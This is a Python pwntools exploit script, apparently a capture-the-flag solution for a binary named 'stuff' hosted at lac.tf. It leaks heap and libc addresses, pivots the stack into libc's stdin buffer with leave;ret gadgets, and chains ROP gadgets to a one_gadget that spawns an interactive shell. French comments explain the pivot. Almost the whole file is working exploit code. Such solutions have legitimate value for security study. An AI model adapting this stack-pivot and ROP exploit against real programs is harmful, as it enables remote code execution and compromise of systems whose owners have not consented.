#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./stuff_patched')
libc = ELF('./libc.so.6')

host = args.HOST or 'lac.tf'
port = int(args.PORT or 31182)

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
    return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
b *main+138
b *main+180
b *main+191
continue
'''.format(**locals())

# -- Exploit goes here --

LEAVE_RET = 0x00401234
FREAD_MAIN = 0x40120f
PRINTF_MAIN = 0x4011f6

OFFSET = cyclic_find(0x6161616161616461, n=8)

io = start()

io.sendlineafter(b'stuff\n',b'1')

io.recvuntil(b'your leak: ')
heap = int(io.recvline()[2:],16)

log.success(f'{heap = :x}')

# payload = b'A' * (OFFSET-8)
# payload += p64(leak)
# payload += p64(0x0040120f)

# Faire un ret leave en heap-0x1008 puis en heap
# permet d'avoir rsp = heap-0X1008 au moment de l'appel à fread
# heap - 0x1008 est le buffer stdin de la libc et donc est écrasé par ce qui est reçu
# donc à l'appel de fread, saved_rip est mis sur heap-0x1000 et est ensuite écrasé par notre second payload

payload = b'2'.rjust(8,b' ')
payload += p64(heap)
payload += p64(FREAD_MAIN)
payload += p64(heap-0x1008)
payload += p64(LEAVE_RET)
io.sendafter(b'stuff\n',payload)
# io.send(payload)

# second payload put libc address in rsi, and leak it
io.send(p64(heap-0x1008)*2+p64(exe.plt['printf'])+p64(PRINTF_MAIN))

io.recvuntil(b': ')
leak_libc = int(io.recvline().strip()[2:],16)

libc.address = leak_libc - libc.sym['_IO_stdfile_0_lock']

log.success(f"{leak_libc = :x} {libc.address = :x}")

onegadgets = one_gadget(libc.path, libc.address)

rop = ROP(libc)
rop.rbx = 0

payload = b'2'.rjust(8,b' ')
payload += p64(0)*2
payload += rop.chain()
payload += p64(onegadgets[0])
io.sendafter(b'stuff\n',payload)

io.interactive()

